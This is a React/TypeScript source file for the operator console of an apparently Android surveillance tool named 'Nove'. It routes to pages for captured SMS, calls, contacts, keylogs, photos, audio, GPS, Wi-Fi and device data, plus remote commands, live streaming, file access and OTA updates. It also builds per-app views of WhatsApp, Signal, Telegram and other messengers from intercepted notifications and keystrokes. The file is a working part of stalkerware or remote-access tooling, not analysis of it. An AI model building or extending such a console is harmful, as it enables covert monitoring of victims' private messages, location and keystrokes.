// Console with extended routes + modern sidebar layout. Drop-in for console.tsx.

import { Routes, Route, Navigate, useLocation, Link } from "react-router-dom";
import { useEffect, useState } from "react";
import type { User } from "firebase/auth";

import LivePage from "./routes/LivePage";
import FilesPage from "./routes/FilesPage";
import CommandPalette from "./routes/CommandPalette";
import MapPage from "./routes/MapPage";
import PanicPage from "./routes/PanicPage";
import OtaPage from "./routes/OtaPage";
import StreamPage from "./routes/StreamPage";

import { DevicesView } from "./devices";
import * as Modules from "./modules";
const { ModulePage, NotificationsModule, MessagesModule, PhotosModule, VideosModule, AudioModule, LocationsModule, WifiModule, DeviceModule, SocialModule } = Modules as any;
import * as ActivityMod from "./activity"; const Activity: any = (ActivityMod as any).Activity;
import { OverviewExtended as Overview } from "./overview-extended";

type BackendStatus = { status: string; version: string; uptime?: number; online?: boolean; unknown?: boolean };

const NAV = [
  { section: "Overview", items: [
    { to: "/", label: "Dashboard", icon: "◈" },
    { to: "/devices", label: "Devices", icon: "▣" },
    { to: "/activity", label: "Activity", icon: "≡" }
  ]},
  { section: "Control", items: [
    { to: "/commands", label: "Commands", icon: "▶" },
    { to: "/live", label: "Live", icon: "●" },
    { to: "/stream", label: "Stream", icon: "▷" },
    { to: "/files", label: "Files", icon: "▤" },
    { to: "/map", label: "Map", icon: "◎" },
    { to: "/panic", label: "Panic", icon: "⚠" },
    { to: "/ota", label: "OTA", icon: "↻" }
  ]},
  { section: "Modules", items: [
    { to: "/sms", label: "SMS", icon: "✉" },
    { to: "/calls", label: "Calls", icon: "☎" },
    { to: "/contacts", label: "Contacts", icon: "☉" },
    { to: "/keylog", label: "Keylog", icon: "⌨" },
    { to: "/notifications", label: "Notifications", icon: "◉" },
    { to: "/photos", label: "Photos", icon: "▣" },
    { to: "/videos", label: "Videos", icon: "▶" },
    { to: "/audio", label: "Audio", icon: "♪" },
    { to: "/locations", label: "GPS", icon: "◎" },
    { to: "/wifi", label: "Wi-Fi", icon: "◌" },
    { to: "/device", label: "Device", icon: "▦" }
  ]}
];

const SOCIAL_APPS = [
  { path: "/whatsapp", label: "WhatsApp", pkg: "com.whatsapp", icon: "W" },
  { path: "/telegram", label: "Telegram", pkg: "org.telegram.messenger", icon: "T" },
  { path: "/messenger", label: "Messenger", pkg: "com.facebook.orca", icon: "M" },
  { path: "/instagram", label: "Instagram", pkg: "com.instagram.android", icon: "I" },
  { path: "/snapchat", label: "Snapchat", pkg: "com.snapchat.android", icon: "S" },
  { path: "/tiktok", label: "TikTok", pkg: "com.zhiliaoapp.musically", icon: "T" },
  { path: "/discord", label: "Discord", pkg: "com.discord", icon: "D" },
  { path: "/viber", label: "Viber", pkg: "com.viber.voip", icon: "V" },
  { path: "/signal", label: "Signal", pkg: "org.thoughtcrime.securesms", icon: "S" },
  { path: "/skype", label: "Skype", pkg: "com.skype.raider", icon: "S" },
  { path: "/twitter", label: "X", pkg: "com.twitter.android", icon: "X" }
];

function Sidebar({ user, status, pathname }: { user: User | null; status: BackendStatus; pathname: string }) {
  return (
    <aside className="sidebar">
      <div className="brand">
        <span className="brand-mark">N</span>
        <div><strong>Nove</strong><br /><span className="muted" style={{ fontSize: 11 }}>v{status?.version || "?"}</span></div>
      </div>
      <nav>
        {NAV.map((s) => (
          <div key={s.section}>
            <p className="nav-h">{s.section}</p>
            {s.items.map((n) => (
              <Link key={n.to} to={n.to} className={pathname === n.to ? "active" : ""}>
                <span style={{ width: 18, textAlign: "center", opacity: 0.7 }}>{n.icon}</span>
                {n.label}
              </Link>
            ))}
          </div>
        ))}
        <p className="nav-h">Social</p>
        {SOCIAL_APPS.map((s) => (
          <Link key={s.path} to={s.path} className={pathname === s.path ? "active" : ""}>
            <span style={{ width: 18, textAlign: "center", opacity: 0.7, fontWeight: 600 }}>{s.icon}</span>
            {s.label}
          </Link>
        ))}
      </nav>
      <div className="sidebar-foot">
        <div className="status-pill">
          <span className="pill-dot" style={{ width: 6, height: 6, borderRadius: 999, background: "var(--green)", boxShadow: "0 0 8px var(--green)" }} />
          {user?.email || "user"}
        </div>
      </div>
    </aside>
  );
}

function AppRoutes({ token, onTokenExpired, adminKey, setAdminKey }: { token: string | null; onTokenExpired?: () => void; adminKey: string; setAdminKey: (k: string) => void }) {
  return (
    <Routes>
      <Route path="/" element={<Overview token={token} onTokenExpired={onTokenExpired} />} />
      <Route path="/devices" element={<DevicesView token={token} onTokenExpired={onTokenExpired} />} />
      <Route path="/activity" element={<Activity token={token} onTokenExpired={onTokenExpired} />} />

      <Route path="/commands" element={<CommandPalette token={token} onTokenExpired={onTokenExpired} />} />
      <Route path="/live" element={<LivePage token={token} onTokenExpired={onTokenExpired} />} />
      <Route path="/files" element={<FilesPage token={token} onTokenExpired={onTokenExpired} />} />
      <Route path="/map" element={<MapPage token={token} onTokenExpired={onTokenExpired} />} />
      <Route path="/panic" element={<PanicPage token={token} onTokenExpired={onTokenExpired} />} />
      <Route path="/stream" element={<StreamPage token={token} onTokenExpired={onTokenExpired} />} />
      <Route path="/ota" element={<OtaPage adminKey={adminKey} onAdminKey={setAdminKey} />} />

      <Route path="/sms" element={<ModulePage token={token} onTokenExpired={onTokenExpired} title="SMS" desc="Messages" collections={["sms"]} render={(m: any) => <MessagesModule entries={m.sms ?? []} />} />} />
      <Route path="/notifications" element={<ModulePage token={token} onTokenExpired={onTokenExpired} title="Notifications" desc="Push" collections={["notifications"]} render={(m: any) => <NotificationsModule entries={m.notifications ?? []} />} />} />
      <Route path="/photos" element={<ModulePage token={token} onTokenExpired={onTokenExpired} title="Photos" desc="Images" collections={["photos","media"]} render={(m: any) => <PhotosModule entries={m.photos ?? []} />} />} />
      <Route path="/videos" element={<ModulePage token={token} onTokenExpired={onTokenExpired} title="Videos" desc="Clips" collections={["videos","media"]} render={(m: any) => <VideosModule entries={m.videos ?? []} />} />} />
      <Route path="/audio" element={<ModulePage token={token} onTokenExpired={onTokenExpired} title="Audio" desc="Voice notes" collections={["audio"]} render={(m: any) => <AudioModule entries={m.audio ?? []} />} />} />
      <Route path="/locations" element={<ModulePage token={token} onTokenExpired={onTokenExpired} title="GPS" desc="Coordinates" collections={["locations"]} render={(m: any) => <LocationsModule entries={m.locations ?? []} />} />} />
      <Route path="/wifi" element={<ModulePage token={token} onTokenExpired={onTokenExpired} title="Wi-Fi" desc="Networks" collections={["network"]} render={(m: any) => <WifiModule entries={m.network ?? []} />} />} />
      <Route path="/device" element={<ModulePage token={token} onTokenExpired={onTokenExpired} title="Device" desc="Specs" collections={["device"]} render={(m: any) => <DeviceModule entries={m.device ?? []} />} />} />

      {SOCIAL_APPS.map((s) => (
        <Route key={s.path} path={s.path} element={
          <ModulePage token={token} onTokenExpired={onTokenExpired} title={s.label} desc={`${s.label} activity`} collections={["notifications","keylog"]} render={(m: any) => <SocialModule entries={[...(m.notifications ?? []), ...(m.keylog ?? [])]} pkg={s.pkg} />} />
        } />
      ))}

      <Route path="*" element={<Navigate to="/" replace />} />
    </Routes>
  );
}

export function ConsoleExtended({ token, user, status, onTokenExpired }: { token: string | null; user: User | null; status: BackendStatus; onTokenExpired?: () => void }) {
  const location = useLocation();
  const [adminKey, setAdminKey] = useState<string>(() => sessionStorage.getItem("ota_admin_key") || "");
  useEffect(() => { sessionStorage.setItem("ota_admin_key", adminKey); }, [adminKey]);
  const label = (NAV.flatMap(s => s.items).find(i => i.to === location.pathname)?.label) ||
                (SOCIAL_APPS.find(s => s.path === location.pathname)?.label) ||
                "Dashboard";
  return (
    <div className="console">
      <Sidebar user={user} status={status} pathname={location.pathname} />
      <main className="console-main">
        <div className="console-topbar">
          <div className="console-breadcrumb">
            <span>Monitoring</span>
            <span className="crumb-sep">/</span>
            <strong>{label}</strong>
          </div>
          <span className="console-updated">Auto-refresh <strong>10–15s</strong> · AES-256-GCM</span>
        </div>
        <div className="console-content">
          <AppRoutes token={token} onTokenExpired={onTokenExpired} adminKey={adminKey} setAdminKey={setAdminKey} />
        </div>
      </main>
    </div>
  );
}
